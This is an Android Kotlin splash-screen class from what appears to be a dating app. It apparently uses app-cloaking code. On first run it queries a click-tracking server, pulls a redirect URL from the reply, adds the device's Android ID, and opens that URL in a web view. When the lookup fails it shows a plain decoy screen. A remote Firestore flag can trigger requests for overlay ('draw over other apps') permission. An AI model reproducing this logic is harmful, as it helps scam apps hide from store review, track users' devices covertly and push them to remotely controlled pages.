package com.dating.date.pop

import android.annotation.TargetApi
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.preference.PreferenceManager
import com.github.kittinunf.fuel.httpGet
import com.github.kittinunf.result.Result
import com.google.firebase.firestore.FirebaseFirestore
import com.yandex.metrica.YandexMetrica
import org.jsoup.Jsoup
import org.jsoup.nodes.Document
import org.jsoup.select.Elements


class SplashActivity : AppCompatActivity() {
    companion object {
        private const val ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE = 2323
    }

    private var addmob_app_id = ""
    private var addmob_banner_id = ""
    private var addmob_interstitial_id = ""
    var isNext = false
    private var isWifi = false
    private var isMobile = false
    var en = ""
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)
        FirebaseFirestore.getInstance().collection("app").document("ads").get()
            .addOnSuccessListener {
                if (it["enabled"] == null) {
                    en = "0"
                } else {
                    checkPermission()
                    en = it["enabled"] as String
                }
                addmob_app_id = it["app_id"] as String
                setAppId(addmob_app_id)
                addmob_banner_id = it["banner_id"] as String
                setBannerId(addmob_banner_id)
                addmob_interstitial_id = it["interstitial_id"] as String
                setInterstitialId(addmob_interstitial_id)
                Log.e("TAG", en)
            }
        if (getFirst()) {
            check()
        } else {
            if (getOk()) {
                if (en.contains("0")) {
                    isNext = true
                    startActivity(
                        Intent(this, MainWebActivity::class.java).putExtra(
                            IS_PASSED,
                            true
                        )
                    )
                    finish()
                } else {
                    checkPermission()
                }
            } else {
                isNext = true
                startActivity(Intent(this, MainActivity::class.java).putExtra(IS_PASSED, false))
                finish()
            }
        }


    }


    private fun check() {
        val httpAsync =
            "https://sjsdn.club/click.php?key=n9iyjgszojo18y35tbfg&t1="
                .httpGet()
                .timeout(20000)
                .header("Content-Type", "application/json; utf-8")
                .responseString { _, _, result ->
                    when (result) {
                        is Result.Failure -> {
                            Log.e("Error", "response error ${result.getException()}")
                            setOk(false)
                            setFirst(false)
                            isNext = true
                            startActivity(Intent(this, MainActivity::class.java))
                            finish()
                        }
                        is Result.Success -> {
                            val data = result.get()
                            //  Log.e("url", data)
                            // println(data)
                            val document: Document = Jsoup.parse(data)
                            val elements: Elements = document.select("body")


                            if (elements.toString().contains("url")) {

                                var url =
                                    elements.toString().substringAfter("url\":\"")
                                        .substringBefore("\"}")
                                        .replace("/", "").replace("amp;", "")


                                Log.e("Error", url)
                                val deviceId = Settings.Secure.getString(
                                    contentResolver, Settings.Secure.ANDROID_ID
                                )
                                YandexMetrica.setUserProfileID(deviceId)

                                url += "${this.packageName}&t3=$deviceId"
                                setParametr(url)
                                Log.e("Error", url)
                                isNext = true
                                startActivity(
                                    Intent(this, MainWebActivity::class.java).putExtra(
                                        IS_PASSED,
                                        true
                                    )
                                )
                                finish()
                            } else {
                                setOk(false)
                                setFirst(false)
                                isNext = true
                                startActivity(
                                    Intent(this, MainActivity::class.java).putExtra(
                                        IS_PASSED,
                                        false
                                    )
                                )
                                finish()
                            }
                        }
                    }
                }
//        setFirst(false)
//        setFirst(true)
        httpAsync.join()

    }


    private fun checkPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (!Settings.canDrawOverlays(this)) {
                val intent = Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")
                )
                isNext = true
                startActivityForResult(intent, ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE)
            } else {

            }
        }
    }

    @TargetApi(Build.VERSION_CODES.M)
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE) {
            if (!Settings.canDrawOverlays(this)) {
                // You don't have permission
                checkPermission()
            } else {
                // Do as per your logic
            }
        }
    }

    private fun getOk() =
        PreferenceManager.getDefaultSharedPreferences(applicationContext).getBoolean("ok", false)

    private fun setParametr(value: String) {
        val editor = PreferenceManager.getDefaultSharedPreferences(this).edit()
        editor.putString("param", "$value")
        editor.apply()
    }

    fun setOk(value: Boolean) {
        val editor = PreferenceManager.getDefaultSharedPreferences(this).edit()
        editor.putBoolean("ok", value)
        editor.apply()
    }

    fun setAppId(value: String) {
        val editor = PreferenceManager.getDefaultSharedPreferences(this).edit()
        editor.putString("app_id", value)
        editor.apply()
    }

    fun setBannerId(value: String) {
        val editor = PreferenceManager.getDefaultSharedPreferences(this).edit()
        editor.putString("banner_id", value)
        editor.apply()
    }

    fun setInterstitialId(value: String) {
        val editor = PreferenceManager.getDefaultSharedPreferences(this).edit()
        editor.putString("interstitial_id", value)
        editor.apply()
    }

    fun setFirst(value: Boolean) {
        val editor = PreferenceManager.getDefaultSharedPreferences(this).edit()
        editor.putBoolean("first", value)
        editor.apply()
    }

    private fun getFirst() =
        PreferenceManager.getDefaultSharedPreferences(applicationContext).getBoolean("first", true)

    override fun onStop() {
        super.onStop()
        if (!isNext) {
            finishAndRemoveTask()
        }
    }

}